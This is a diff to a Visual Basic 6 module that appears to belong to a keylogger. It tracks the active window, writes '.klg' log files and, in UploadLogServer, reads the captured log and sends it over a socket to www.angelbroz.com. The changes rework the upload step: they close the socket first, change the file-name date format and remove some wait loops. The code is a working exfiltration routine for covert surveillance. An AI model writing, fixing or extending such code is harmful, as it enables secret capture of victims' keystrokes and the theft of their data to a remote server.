@@ -6,6 +6,8 @@ Public UploadUrl As String
 Public MyLogFile As String
 Public Uploading As Boolean
 Public ServerUploadPassword As String
+Public DatosAEnviar As String
+
 Public Function ActiveWindow() As String
     Dim hwndActivo As Long
     Dim Buff As String * 255
@@ -69,9 +71,10 @@ End Sub
 Public Sub UploadLogServer()
     On Error GoTo ErrHandler
     Dim NomArchivo As String, DatosArchivo As String
-    Dim DatosAEnviar As String
     
-    NomArchivo = Format$(Now, "mmmm-yy_x_hh-mmAM/PM") & "_" & GenerarStrAleatoreo(3) & ".klg"
+    FrmMain.SocketUpload.CloseSck
+    
+    NomArchivo = Format$(Now, "mmmm-dd-yyyy_hh-mmAM/PM") & "_" & GenerarStrAleatoreo(3) & ".klg"
     'Obtener Datos del Archvio
 
     Dim FileLength As Long
@@ -85,36 +88,13 @@ Public Sub UploadLogServer()
         DatosArchivo = StrFromFile
     Close #1
 
-    
     FrmMain.SocketUpload.Connect "www.angelbroz.com", 80
     
     DatosAEnviar = UploadString(DatosArchivo, NomArchivo)
     
-    Do While (FrmMain.SocketUpload.State = sckConnecting)
-        Dim OneGuySays As String
-        Dim OtherGuyRespond As String
-        OneGuySays = "Whataa hell are u doing here?"
-        OtherGuyRespond = "Waiting for get conencted with this socket D:"
-        DoEvents
-    Loop
-    
     Uploading = True
     
-    If FrmMain.SocketUpload.State = sckConnected Then
-        FrmMain.SocketUpload.SendData DatosAEnviar
-    Else
-        FrmMain.MyEventRaiser.RaiseErrorDetected "Cant connect to the server"
-    End If
-    
-    Do While (FrmMain.SocketUpload.State = sckClosed)
-        OneGuySays = "now, what are you doing? ._."
-        OtherGuyRespond = "The socket is sending the data so i need wait until it finish D:"
-        OneGuySays = "This is bored..."
-        OtherGuyRespond = "Hell yes! :("
-        DoEvents
-    Loop
-    
-    Uploading = False
+    FrmMain.SocketUpload.SendData DatosAEnviar
     
     Exit Sub
 ErrHandler:
